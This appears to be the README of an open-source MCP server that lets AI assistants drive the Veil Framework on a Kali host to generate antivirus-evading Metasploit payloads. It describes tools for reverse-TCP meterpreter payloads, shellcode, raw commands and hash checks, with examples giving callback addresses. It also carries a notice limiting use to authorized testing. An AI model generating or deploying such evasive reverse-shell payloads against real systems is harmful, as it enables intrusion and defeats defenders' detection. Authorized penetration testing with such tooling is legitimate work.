# Veil-Evasion MCP Server

[![MCP](https://img.shields.io/badge/MCP-Compatible-blue)](https://modelcontextprotocol.io)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Node.js](https://img.shields.io/badge/Node.js-18%2B-green)](https://nodejs.org)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue)](https://www.typescriptlang.org)

A [Model Context Protocol (MCP)](https://modelcontextprotocol.io) server for interacting with the [Veil Framework](https://github.com/Veil-Framework/Veil) - a tool designed to generate Metasploit payloads that bypass common anti-virus solutions.

## Overview

This MCP server enables AI assistants to interact with Veil for security testing purposes, providing tools for:

- Listing available payload types and tools
- Generating AV-evading payloads
- Creating custom shellcode
- Managing generated artifacts
- Checking payload hashes against VirusTotal (hash-only, no upload)

## Requirements

- **Node.js** 18 or higher
- **SSH access** to a Kali Linux host with Veil 3.x installed
- **SSH key-based authentication** configured for the Kali host

## Installation

```bash
# Clone the repository
git clone https://github.com/schwarztim/sec-veil-evasion-mcp.git
cd sec-veil-evasion-mcp

# Install dependencies
npm install

# Build the TypeScript source
npm run build
```

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `VEIL_KALI_HOST` | SSH hostname for Kali Linux | `kali` |
| `VEIL_PATH` | Path to Veil.py on Kali | `/usr/share/veil/Veil.py` |

### Claude Desktop Configuration

Add to your Claude Desktop configuration (`~/.config/claude/claude_desktop_config.json` on Linux or `~/Library/Application Support/Claude/claude_desktop_config.json` on macOS):

```json
{
  "mcpServers": {
    "veil-evasion": {
      "command": "node",
      "args": ["/path/to/sec-veil-evasion-mcp/dist/index.js"],
      "env": {
        "VEIL_KALI_HOST": "your-kali-hostname",
        "VEIL_PATH": "/usr/share/veil/Veil.py"
      }
    }
  }
}
```

## Available Tools

### veil_list_tools
List available Veil tools (Evasion, Ordnance).

### veil_list_payloads
List all available payloads for a specific tool.
- `tool` (required): `"Evasion"` or `"Ordnance"`

### veil_payload_info
Get detailed information about a specific payload.
- `tool` (required): `"Evasion"` or `"Ordnance"`
- `payload` (required): Payload name or number

### veil_generate
Generate a payload with specified options.
- `tool` (required): `"Evasion"` or `"Ordnance"`
- `payload` (required): Payload name or number
- `lhost` (required): Callback IP address
- `lport`: Callback port (default: `4444`)
- `output_name`: Base name for output files
- `shellcode_method`: `"msfvenom"` or `"ordnance"`
- `msfvenom_payload`: MSFVenom payload string
- `custom_options`: Additional payload options

### veil_generate_shellcode
Generate shellcode only using Veil-Ordnance.
- `payload` (required): Ordnance payload type
- `lhost` (required): Callback IP
- `lport`: Callback port (default: `4444`)
- `encoder`: Encoder to use
- `iterations`: Encoding iterations

### veil_check_hash
Check payload hash against VirusTotal (hash only, no upload).
- `file_path` (required): Path to payload file on Kali

### veil_clean
Clean up generated payloads and artifacts.
- `clean_all`: If true, cleans all files (default: `true`)

### veil_list_generated
List all previously generated payloads.

### veil_version
Get Veil framework version information.

### veil_update
Update the Veil framework.

### veil_raw_command
Execute raw Veil commands for advanced usage.
- `args` (required): Command line arguments

## Usage Examples

### List available payloads

```
veil_list_payloads { "tool": "Evasion" }
```

### Generate a reverse TCP payload

```
veil_generate {
  "tool": "Evasion",
  "payload": "go/meterpreter/rev_tcp",
  "lhost": "192.168.1.100",
  "lport": 4444,
  "output_name": "test_payload"
}
```

### Generate shellcode

```
veil_generate_shellcode {
  "payload": "rev_tcp",
  "lhost": "192.168.1.100",
  "lport": 443
}
```

## Architecture

```
┌─────────────────┐     SSH      ┌─────────────────┐
│  Claude/MCP     │──────────────│   Kali Linux    │
│  Client         │              │   + Veil 3.x    │
└─────────────────┘              └─────────────────┘
        │
        ▼
┌─────────────────┐
│  veil-evasion   │
│  MCP Server     │
└─────────────────┘
```

The server executes Veil commands via SSH on a remote Kali Linux host, allowing secure payload generation from any system with SSH access.

## Security Notice

**This tool is designed for authorized penetration testing and security research only.**

- Always obtain proper written authorization before testing systems you do not own
- Never use generated payloads against systems without explicit permission
- Follow all applicable laws and regulations in your jurisdiction
- The authors are not responsible for misuse of this tool

## Development

```bash
# Watch mode for development
npm run dev

# Build the project
npm run build

# Run the server
npm start
```

## License

MIT License - see [LICENSE](LICENSE) for details.

## Related Projects

- [Veil Framework](https://github.com/Veil-Framework/Veil) - The underlying payload generation framework
- [Model Context Protocol](https://modelcontextprotocol.io) - The protocol specification
- [MCP TypeScript SDK](https://github.com/modelcontextprotocol/typescript-sdk) - The SDK used to build this server

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request
